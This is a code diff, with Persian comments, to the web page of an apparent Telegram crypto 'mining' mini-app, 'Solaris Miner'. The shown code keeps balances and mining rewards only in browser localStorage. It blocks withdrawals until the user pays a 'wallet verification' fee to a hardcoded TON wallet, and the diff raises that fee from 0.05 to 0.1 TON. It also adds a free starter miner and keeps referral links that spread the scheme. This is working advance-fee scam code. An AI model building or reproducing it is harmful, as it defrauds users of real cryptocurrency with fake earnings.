@@ -745,7 +745,6 @@
                 <button class="wallet-action-btn" style="background: #f97316; color: #fff; padding: 10px 20px; flex: unset;" onclick="collectFriendReward()">Collect</button>
             </div>
 
-            <!-- کادر دعوت همراه با دکمه ارسال مستقیم لینک -->
             <div class="wallet-menu-box" style="flex-direction: column; align-items: flex-start; gap: 8px; cursor: default;">
                 <div style="font-size: 11px; color: #fed7aa;">Your invitation link</div>
                 <div style="display: flex; width: 100%; gap: 8px;">
@@ -791,7 +790,8 @@
 
             <div id="ton-connect-button-container"></div>
 
-            <button class="verify-wallet-btn" id="verify-wallet-btn-id" onclick="verifyWalletWith005Ton()">Verify Wallet (0.05 TON)</button>
+            <!-- دکمه وریفای جدید با مبلغ 0.1 TON -->
+            <button class="verify-wallet-btn" id="verify-wallet-btn-id" onclick="verifyWalletWith01Ton()">Verify Wallet (0.1 TON)</button>
 
             <div class="support-card">
                 <div class="support-title">🎧 Secure & Instant Support</div>
@@ -940,7 +940,7 @@
     <script>
         const recipientWalletAddress = "UQB9Q80VvzlJSFsfGBA6IO1Yh3UMcGJfGyNmq3PejlPIdR9v";
         const supportTelegramId = "Dollar_Matrix";
-        const botUsername = "SolarisMiner_bot"; // آیدی صحیح ربات شما
+        const botUsername = "SolarisMiner_bot";
         
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://radintoken-dotcom.github.io/solaris-miner/tonconnect-manifest.json',
@@ -966,7 +966,7 @@
         });
 
         function initTelegramUser() {
-            let currentUserId = "1007321991"; // پیش‌فرض برای تست خارج از تلگرام
+            let currentUserId = "1007321991";
             if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe) {
                 const tgUser = window.Telegram.WebApp.initDataUnsafe.user;
                 if (tgUser) {
@@ -989,7 +989,6 @@
                 }
             }
             
-            // تولید لینک اختصاصی رفرال بر اساس آیدی عددی منحصر به فرد هر کاربر
             const refLink = `https://t.me/${botUsername}?start=${currentUserId}`;
             document.getElementById('ref-link-input').value = refLink;
             checkUrlReferral();
@@ -1037,13 +1036,14 @@
             alert("✅ Friend rewards collected successfully into your balance!");
         }
 
-        async function verifyWalletWith005Ton() {
+        // تابع تایید ولت با مبلغ 0.1 TON
+        async function verifyWalletWith01Ton() {
             if (!tonConnectUI.connected) {
                 alert("⚠️ Please connect your wallet first using the Connect Wallet button!");
                 return;
             }
 
-            const nanoTon = Math.floor(0.05 * 1000000000).toString();
+            const nanoTon = Math.floor(0.1 * 1000000000).toString();
             const transaction = {
                 validUntil: Math.floor(Date.now() / 1000) + 600,
                 messages: [{ address: recipientWalletAddress, amount: nanoTon }]
@@ -1058,12 +1058,12 @@
                     btn.onclick = null;
 
                     state.isVerifiedWallet = true;
-                    state.totalDeposited += 0.05;
-                    state.lastDepositAmount = 0.05;
-                    state.balance += 0.05;
+                    state.totalDeposited += 0.1;
+                    state.lastDepositAmount = 0.1;
+                    state.balance += 0.1;
                     
                     state.depositsHistory.unshift({
-                        amount: 0.05,
+                        amount: 0.1,
                         type: 'Wallet Verification',
                         date: new Date().toLocaleString()
                     });
@@ -1078,8 +1078,9 @@
             }
         }
 
+        // فهرست ماینرها - تغییر قیمت ماینر اول به رایگان (Free / 0 TON)
         const initialProperties = [
-            { id: 1, name: "Solaris Alpha", desc: "Compact entry-level mining unit", daily: 0.10, monthly: 3.00, price: 0.10 },
+            { id: 1, name: "Solaris Alpha", desc: "Compact entry-level mining unit", daily: 0.10, monthly: 3.00, price: 0 },
             { id: 2, name: "Solaris Quantum", desc: "Single-board residential setup", daily: 0.66, monthly: 19.80, price: 3.00 },
             { id: 3, name: "Solaris Helios", desc: "High-performance dual fan rig", daily: 1.20, monthly: 36.00, price: 5.00 },
             { id: 4, name: "Solaris Stellar", desc: "Multi-tier cooling tower rig", daily: 2.60, monthly: 78.00, price: 10.00 },
@@ -1115,7 +1116,7 @@
         };
 
         function loadState() {
-            const saved = localStorage.getItem('solaris_miner_save_v65');
+            const saved = localStorage.getItem('solaris_miner_save_v66');
             if (saved) {
                 try { state = JSON.parse(saved); } catch(e) {}
             }
@@ -1145,7 +1146,7 @@
 
         function saveState() {
             state.lastTick = Date.now();
-            localStorage.setItem('solaris_miner_save_v65', JSON.stringify(state));
+            localStorage.setItem('solaris_miner_save_v66', JSON.stringify(state));
         }
 
         function getTotalDailyRate() {
@@ -1163,6 +1164,7 @@
 
             initialProperties.forEach(item => {
                 const isOwned = state.ownedIds.includes(item.id);
+                const displayPrice = item.price === 0 ? "Free" : item.price + " TON";
                 
                 const monitorHTML = `
                     <div class="hollyland-monitor-box ${isOwned ? 'active' : ''}">
@@ -1210,7 +1212,7 @@
                         </div>
 
                         <div class="property-footer">
-                            <div class="property-price">${item.price + ' TON'}</div>
+                            <div class="property-price" style="${item.price === 0 ? 'color:#34d399;' : ''}">${displayPrice}</div>
                             <button class="btn-buy" style="${isOwned ? 'background:rgba(45,18,0,0.8); color:#fed7aa; cursor:default;' : ''}" onclick="buyProperty(${item.id})">${isOwned ? 'Purchased' : 'Start Mining'}</button>
                         </div>
                     </div>
@@ -1313,9 +1315,10 @@
             }
         }
 
+        // بررسی شرط جدید 0.1 TON برای برداشت
         function processWithdraw() {
             if (!state.isVerifiedWallet) {
-                alert("⚠️ Please verify your wallet first by tapping 'Verify Wallet (0.05 TON)' to enable withdrawal!");
+                alert("⚠️ Please verify your wallet first by tapping 'Verify Wallet (0.1 TON)' to enable withdrawal!");
                 closeModal('withdraw-modal');
                 return;
             }
